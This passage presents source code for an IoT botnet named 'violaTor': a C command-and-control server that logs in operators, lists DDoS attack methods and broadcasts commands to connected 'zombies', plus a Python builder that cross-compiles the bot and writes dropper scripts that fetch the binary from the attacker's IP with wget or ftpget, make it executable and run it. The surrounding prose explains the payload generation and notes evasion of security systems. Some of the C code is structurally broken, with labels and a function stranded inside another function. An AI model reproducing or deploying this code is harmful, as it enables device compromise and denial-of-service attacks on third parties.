                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event); // add the new socket to epoll
                    if (s == -1) { // check for errors
                        perror("epoll_ctl"); // print epoll_ctl error message
                        close(infd); // close the file descriptor
                        break; // break the loop
                    }
                    clients[infd].connected = 1; // mark the client as connected
                }
                continue; // continue to the next event
            } else {
                // handle data from a client
                int datafd = events[i].data.fd; // get the file descriptor from the event
                struct clientdata_t *client = &(clients[datafd]); // get the client data
                int done = 0; // flag for completion
                client->connected = 1; // mark the client as connected

                // loop for handling client data
                while (1) {
                    ssize_t count; // variable for data count
                    char buf[2048]; // buffer for client data
                    memset(buf, 0, sizeof buf); // clear the buffer

                    // loop for reading client data
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) { // check if newline is present
                            done = 1; // set completion flag
                            break; // break the loop
                        }
                        trim(buf); // trim the buffer

                        // respond to ping with pong
                        if (strcmp(buf, "PING") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { // send pong response
                                done = 1; // set completion flag
                                break; // break the loop
                            }
                            continue; // continue to the next iteration
                        }

                        // handle report command
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7; // get the report message
                            fprintf(telFD, "%s\n", line); // write the message to the file
                            fflush(telFD); // flush the file buffer
                            TELFound++; // increment telnet found counter
                            continue; // continue to the next iteration
                        }

                        // handle probing command
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING"); // get the probing message
                            scannerreport = 1; // set scanner report flag
                            continue; // continue to the next iteration
                        }

                        // handle removing probe command
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE"); // get the removing probe message
                            scannerreport = 0; // clear scanner report flag
                            continue; // continue to the next iteration
                        }

                        // ignore pong responses
                        if (strcmp(buf, "PONG") == 0) {
                            continue; // continue to the next iteration
                        }

                        // print the buffer to stdout
                        printf("buf: \"%s\"\n", buf);
                    }

                    // check if read operation is complete
                    if (count == -1) {
                        if (errno != EAGAIN) { // check if the error is not due to non-blocking I/O
                            done = 1; // set completion flag
                        }
                        break; // break the loop
                    } else if (count == 0) {
                        done = 1; // set completion flag
                        break; // break the loop
                    }

                    // if done, close the client connection
                    if (done) {
                        client->connected = 0; // mark client as not connected
                        close(datafd); // close the file descriptor
                    }
                }
            }
        }
    }
}
// broadcast a message to all connected clients except the sender
void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1; // flag to send message
    if(strcmp(msg, "PING") == 0) sendMGM = 0; // do not broadcast for ping messages
    char *wot = malloc(strlen(msg) + 10); // allocate memory for the message
    memset(wot, 0, strlen(msg) + 10); // clear the memory
    strcpy(wot, msg); // copy the message to wot
    trim(wot); // trim the message
    time_t rawtime; 
    struct tm *timeinfo;
    time(&rawtime); // get current time
    timeinfo = localtime(&rawtime); // convert to local time
    char *timestamp = asctime(timeinfo); // convert to string
    trim(timestamp); // trim the timestamp
    int i;
    for(i = 0; i < MAXFDS; i++) { // iterate through all possible file descriptors
        if(i == us || (!clients[i].connected)) continue; // skip sender and disconnected clients
        if(sendMGM && managements[i].connected) { // check if we need to send the message
            send(i, "\e[1;95m", 9, MSG_NOSIGNAL); // send the color code
            send(i, sender, strlen(sender), MSG_NOSIGNAL); // send the sender's name
            send(i, ": ", 2, MSG_NOSIGNAL); // send a colon and space
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL); // send the actual message
        send(i, "\n", 1, MSG_NOSIGNAL); // send a newline character
    }
    free(wot); // free the allocated memory
}

// count the number of connected bots
unsigned int BotsConnected() {
    int i = 0, total = 0; // initialize counters
    for(i = 0; i < MAXFDS; i++) { // iterate through all possible file descriptors
        if(!clients[i].connected) continue; // skip if not connected
        total++; // increment the total for each connected bot
    }
    return total; // return the total number of connected bots
}

// find a login in a file and return the line number
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512]; // buffer for line

    if((fp = fopen("login.txt", "r")) == NULL) { // open the file
        return(-1); // return -1 if file cannot be opened
    }
    while(fgets(temp, 512, fp) != NULL) { // read lines from the file
        if((strstr(temp, str)) != NULL) { // check if the line contains the string
            find_result++; // increment result count
            find_line = line_num; // store the line number
        }
        line_num++; // increment line number
    }
    if(fp)
        fclose(fp); // close the file
    if(find_result == 0) return 0; // return 0 if not found
    return find_line; // return the line number where found
}
// function to handle each connected bot
void *BotWorker(void *sock) {
    int datafd = (int)sock; // cast sock to an integer to use as a data file descriptor
    int find_line;
    OperatorsConnected++; // increment the count of connected operators
    pthread_t title; // thread for managing titles
    char buf[2048]; // buffer for storing incoming data
    memset(buf, 0, sizeof buf); // clear the buffer
    char sentattacks[2048]; // buffer for sent attack messages
    memset(sentattacks, 0, 2048); // clear the sentattacks buffer
    char devicecount [2048]; // buffer for device count messages
    memset(devicecount, 0, 2048); // clear the devicecount buffer

    FILE *fp; // file pointer
    int i = 0;
    int c;
    fp = fopen("login.txt", "r"); // open login.txt file for reading
    while(!feof(fp)) { // read characters from the file
        c = fgetc(fp);
        ++i;
    }
    int j = 0;
    rewind(fp); // rewind the file pointer to the beginning of the file
    while(j != i - 1) { // read username and password pairs from the file
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }

    char clearscreen [2048]; // buffer for clear screen command
    memset(clearscreen, 0, 2048);
    sprintf(clearscreen, "\033[1A"); // write clear screen command to the buffer
    char user [10000]; // buffer for the username prompt

    sprintf(user, "\e[38;5;20musername\e[0m: \e[0m"); // format the username prompt

    if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end; // send the username prompt to the datafd
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // read the username from datafd into buf
    trim(buf); // trim the buffer
    char* nickstring;
    sprintf(accounts[find_line].username, buf); // copy the username from buf to accounts array
    nickstring = ("%s", buf); // set nickstring to buf
    find_line = Find_Login(nickstring); // find the line in login.txt corresponding to nickstring
    if(strcmp(nickstring, accounts[find_line].username) == 0){ // check if the nickstring matches the username in accounts array
        char password [10000]; // buffer for the password prompt
        sprintf(password, "\e[38;5;21mpassword\e[0m: \e[30m", accounts[find_line].username); // format the password prompt
        if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end; // send the password prompt to the datafd

        if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // read the password from datafd into buf

        trim(buf); // trim the buffer
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed; // check if the password matches
        memset(buf, 0, 2048); // clear the buffer
        
        goto Banner; // go to the Banner label
    }
// function to update the terminal title for a connected client
void *TitleWriter(void *sock) {
    int datafd = (int)sock; // cast socket to integer data file descriptor
    char string[2048]; // buffer for the terminal title string

    // continuously update terminal title
    while(1) {
        memset(string, 0, 2048); // clear the string buffer
        // format the title string with the number of connected bots
        sprintf(string, "%c]0;violaTor v2 | zombies: %d %c", '\033', BotsConnected(), '\007');
        // send the title string to the client
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return; // exit if send fails
        sleep(2); // wait for 2 seconds before updating again
    }
}
                // labels for handling failed login and displaying banner
        failed:
            // this label is a placeholder for handling failed login attempts

        Banner:
            // create a thread to continuously update the terminal title
            pthread_create(&title, NULL, &TitleWriter, datafd);

            // banner strings initialization
            char banner0[10000];
            char banner1[10000];
            char banner2[10000];
            char banner3[10000];
            char banner4[10000];
            char banner5[10000];
            char banner6[10000];
            char banner7[10000];

            // format banner strings with welcome messages and bot counts
            sprintf(banner4, "\e[38;5;135mhi\e[0m\r\n");
            sprintf(banner5, "\e[38;5;135mhi!\e[0m\r\n");
            sprintf(banner6,  "\e[38;5;135m---------------zombies: %d----------\e[0m\r\n", BotsConnected());
            sprintf(banner7,  "\e[38;5;135muser: %s\e[0m\r\n", accounts[find_line].username);
            if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) return;
            if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) return;
            sleep(1);
            if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) return;
            sleep(1);
            if(send(datafd, banner7, strlen(banner7), MSG_NOSIGNAL) == -1) return;
            
            while(1) {
            char input [10000];
            sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
            sleep(1);
            if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            break;
            }
            pthread_create(&title, NULL, &TitleWriter, sock);
            managements[datafd].connected = 1;

            while(fdgets(buf, sizeof buf, datafd) > 0) {
            // handle different commands
            if (strstr(buf, "help")) {
            // if command is 'help', display help menu
            pthread_create(&title, NULL, &TitleWriter, sock); // create title writer thread
            char help1[800], help2[800], help3[800], help4[800], help6[800], help7[800], help8[800];
            
            // setting up help menu text
            sprintf(help1, "\e[1;95m╔═══════════════════════════════════════╗\e[0m\r\n");
            sprintf(help2, "\e[1;95m║\e[0m \e[0;96mATTACK\e[0m - attack commands       \e[1;95m║\e[0m\r\n");
            sprintf(help3, "\e[1;95m║\e[0m \e[0;96mSTATS\e[0m - server stats           \e[1;95m║\e[0m\r\n");
            sprintf(help6, "\e[1;95m║\e[0m \e[0;96mCLEAR\e[0m - clear + head back to banner \e[1;95m║\e[0m\r\n");
            sprintf(help7, "\e[1;95m║\e[0m \e[0;96mEXIT\e[0m - exit server           \e[1;95m║\e[0m\r\n");
            sprintf(help8, "\e[1;95m╚═══════════════════════════════════════╝\e[0m\r\n");



            // sending the help menu text
            if(send(datafd, help1, strlen(help1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help2, strlen(help2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help3, strlen(help3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help6, strlen(help6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help7, strlen(help7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help8, strlen(help8), MSG_NOSIGNAL) == -1) goto end;

            // prompt for next input
            char input[10000];
            sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
            if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            continue;
        }
        if(strstr(buf, "attack") || strstr(buf, "ATTACK") || strstr(buf, "METHODS") || strstr(buf, "methods")) {
                pthread_create(&title, NULL, &TitleWriter, sock);
                char attack1  [800];
                char attack2  [800];
                char attack3  [800];
                char attack4  [800];
                char attack5  [800];
                char attack6  [800];
                char attack7  [800];
                char attack8  [800];
                char attack9  [800];
                char attack10  [800];
                char attack11  [800];
                char attack12  [800];
                char attack13  [800];
                char attack14  [800];
                char attack15  [800];
                char attack16  [800];
                char attack17  [800];
                char attack18  [800];
                char attack19  [800];

                sprintf(attack1,  "\e[38;5;53mmeTh0ds\e[0m\r\n");
                sprintf(attack2,  "\e[38;5;53mHOME METHODS\e[0m\r\n");
                sprintf(attack3,  "\e[38;5;20m! UDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack4,  "\e[38;5;20m! STD \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack5,  "\e[38;5;20m! ECHO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack6,  "\e[38;5;53mBYPASS METHODS \e[0m\r\n");
                sprintf(attack7,  "\e[38;5;20m! ZGO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack8,  "\e[38;5;20m! ZDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack9,  "\e[38;5;20m! GAME \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack10,  "\e[38;5;20m! NFO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack11,  "\e[38;5;20m! OVH \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack12,  "\e[38;5;20m! VPN \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack13,  "\e[38;5;53mPROTOCOL METHODS \e[0m\r\n");
                sprintf(attack14,  "\e[38;5;20m! XTD \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack15,  "\e[38;5;20m! LDAP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack16,  "\e[38;5;20m! SDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack17,  "\e[38;5;20m! MEM \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack18,  "\e[38;5;20m! RIP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack19,  "\e[38;5;20m! VSE \e[0m[IP] [PORT] [TIME] \e[0m\r\n");


                    
                if(send(datafd, attack1,  strlen(attack1),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack2,  strlen(attack2),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack3,  strlen(attack3),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack4,  strlen(attack4),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack5,  strlen(attack5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack6,  strlen(attack6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack7,  strlen(attack7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack8,  strlen(attack8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack9,  strlen(attack9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack10,  strlen(attack10),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack11,  strlen(attack11),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack12,  strlen(attack12),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack13,  strlen(attack13),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack14,  strlen(attack14),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack15,  strlen(attack15),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack16,  strlen(attack16),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack17,  strlen(attack17),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack18,  strlen(attack18),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack19,  strlen(attack19),    MSG_NOSIGNAL) == -1) goto end;


                pthread_create(&title, NULL, &TitleWriter, sock);
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                continue;
        }

            if(strstr(buf, "STATS") || strstr(buf, "zombies") || strstr(buf, "stats")) {
                char devicecount [2048];
                memset(devicecount, 0, 2048);
                char onlineusers [2048];
                char userconnected [2048];
                sprintf(devicecount, "\e[0mzombies connected: %d\e[0m\r\n", BotsConnected());       
                sprintf(onlineusers, "\e[0musers online: %d\e[0m\r\n", OperatorsConnected);
                sprintf(userconnected, "\e[0muser: %s\e[0m\r\n", accounts[find_line].username);
                if(send(datafd, devicecount, strlen(devicecount), MSG_NOSIGNAL) == -1) return;
                if(send(datafd, onlineusers, strlen(onlineusers), MSG_NOSIGNAL) == -1) return;
                if(send(datafd, userconnected, strlen(userconnected), MSG_NOSIGNAL) == -1) return;
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                continue;
            }

            if(strstr(buf, "clear")) {
                char clearscreen [2048];
                memset(clearscreen, 0, 2048);
  sprintf(clearscreen, "\033[2J\033[1;1H");
  if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) goto end;

                while(1) {
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
            if(strstr(buf, "exit")) {
                char exitmessage [2048];
                memset(exitmessage, 0, 2048);
                sprintf(exitmessage, "\e[0mexiting server in 3s...\e[0m", accounts[find_line].username);
                if(send(datafd, exitmessage, strlen(exitmessage), MSG_NOSIGNAL) == -1)goto end;
                sleep(3);
                goto end;
            }

        if(strstr(buf, "! UDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STD")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ECHO")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ZGO"))
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ZDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! GAME")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! NFO")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! OVH")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! VPN")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! XTD")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! LDAP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! SDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! RIP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! MEM")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! VSE")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STOP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
            trim(buf);
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;

        // if the buffer is empty, continue to the next iteration
        if(strlen(buf) == 0) continue;

        // log the user command
        printf("\e[1;95muser: %s | command: %s\e[0m\n", accounts[find_line].username, buf);

        FILE *logfile = fopen("Logs.log", "a");
        fprintf(logfile, "user: %s | command: %s\n", accounts[find_line].username, buf);
        fclose(logfile);

        // broadcast the command
        broadcast(buf, datafd, accounts[find_line].username);

        // clear the buffer for the next command
        memset(buf, 0, 2048);
    }

    // handle disconnection
    end:
    managements[datafd].connected = 0; // mark management as disconnected
    close(datafd); // close the data socket
    OperatorsConnected--; // decrement the number of connected operators
}
// function to listen for incoming bot connections
void *BotListener(int port) {
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0); // create a socket
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr)); // clear the server address structure
    serv_addr.sin_family = AF_INET; // set the address family to IPv4
    serv_addr.sin_addr.s_addr = INADDR_ANY; // listen on any interface
    serv_addr.sin_port = htons(port); // set the port to listen on
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding"); // bind the socket
    listen(sockfd,5); // listen for incoming connections
    clilen = sizeof(cli_addr); // set the size of the client address
    while(1) { // main loop to accept incoming connections
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // accept a new connection
        if (newsockfd < 0) perror("ERROR on accept"); // error handling
        pthread_t thread; // create a thread for each connection
        pthread_create(&thread, NULL, &BotWorker, (void *)newsockfd); // start the BotWorker thread
    }
}
int main (int argc, char *argv[], void *sock) {
    // welcome message
    printf("\e[0;96mwelcome to violaTor\e[0m\n");

    // ignore broken pipe signals to avoid crashes
    signal(SIGPIPE, SIG_IGN);

    // define variables for server setup
    int s, threads, port;
    struct epoll_event event;

    // check for correct number of command line arguments
    if (argc != 4) {
        fprintf(stderr, "\e[1;95m[!]incorrect[!]\e[0m\n");
        exit(EXIT_FAILURE);
    }

    // convert command line arguments to port number and number of threads
    port = atoi(argv[3]);
    threads = atoi(argv[2]);

    // create and bind a socket to a port
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();

    // set the socket to non-blocking mode
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();

    // start listening for connections on the socket
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }

    // create an epoll instance for managing multiple file descriptors
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }

    // add the listening socket to the epoll instance
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }

    // create threads for handling bot events
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *)NULL);
    }

    // create a thread for listening for new connections
    pthread_create(&thread[0], NULL, &BotListener, port);

    // continuously broadcast a ping message every 60 seconds
    while (1) {
        broadcast("PING", -1, "violaTor");
        sleep(60);
    }

    // close the listening socket before exiting
    close(listenFD);
    return EXIT_SUCCESS;
}
```


## **builder.py**

this is a builder script for generating payloads. it's designed to create customized payloads that, when executed on a target, install and run the bot client.

**imports + constants**: the script imports necessary python libraries such as `os` for interacting with the operating system, `sys` for accessing system-specific parameters and functions, and `random` for generating random numbers. it also defines several constants used in the script. for instance, `PAYLOAD_NAME` specifies the name of the payload file, `PAYLOAD_DIR` specifies the directory where the payload files will be stored, `SERVER_LIST` is a list of server IP addresses and ports, and `ARCHS` is a list of architectures for which the payloads will be generated.

**payload generation**: the `generate_payload` function generates a shell script that, when executed on a target machine, downloads and runs the bot client. it uses python's string formatting to insert the server IP, port, and architecture into the shell script. the shell script uses `wget` and `curl` to download the bot client from the server, `chmod` to make the downloaded file executable, and `./` to run the executable file.

**main function**: the main function of the script loops over each server in the server list and each architecture in the architecture list, calling the `generate_payload` function with the server IP, port, and architecture as parameters. it then writes the generated payload to a file using python's built-in `open` function with the 'write' mode (`w`).

**file operations**: the script uses the `os.path.exists` function to check if the payload directory exists, and the `os.makedirs` function to create the directory if it doesn't exist. it then uses the `open` function to create a file in the payload directory for each payload, and the `write` method to write the payload to the file.

**randomization**: the script uses the `random.choice` function to randomly select a server from the server list for each payload. this adds an element of unpredictability to the payloads, making it harder for security systems to predict and block them.

```python
import subprocess, sys

# check if ip address is provided as a command line argument
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;36mIncorrect Usage!")
    print("\x1b[0;35mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

# function to run shell commands
def run(cmd):
    subprocess.call(cmd, shell=True)

# get bot filename from arguments
bot = sys.argv[1]

# ask user if they want to fetch architecture compilers
torrer = raw_input("Y/n Get Arch-")
get_arch = torrer.lower() == "y"

# compiler names and corresponding download URLs
compileas = []

getarch = [
    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
    'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2'
]

# compiler names
ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-armv7l",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l"]

# clear tftpboot and ftp directories
run("/var/lib/tftpboot/* /var/ftp/*")

# download and set up compilers if requested
if get_arch:
    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

# compile bot for each architecture
num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./" + cc + "/bin/" + arch + "-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

# setup http and tftp services
run("yum install httpd -y")
run("service httpd start")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

# setup tftp service
run('''echo -e "# default: off\n
service tftp\n
{\n
    socket_type             = dgram\n
    protocol                = udp\n
    wait                    = yes\n
    user                    = root\n
    server                  = /usr/sbin/in.tftpd\n
    server_args             = -s -c /var/lib/tftpboot\n
    disable                 = no\n
    per_source              = 11\n
    cps                     = 100 2\n
    flags                   = IPv4\n
}\n
" > /etc/xinetd.d/tftp''')

# ... other service configurations ...
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

# move compiled bots to web and tftp directories
for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

# create shell scripts for deployment
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/terror.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/terror.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
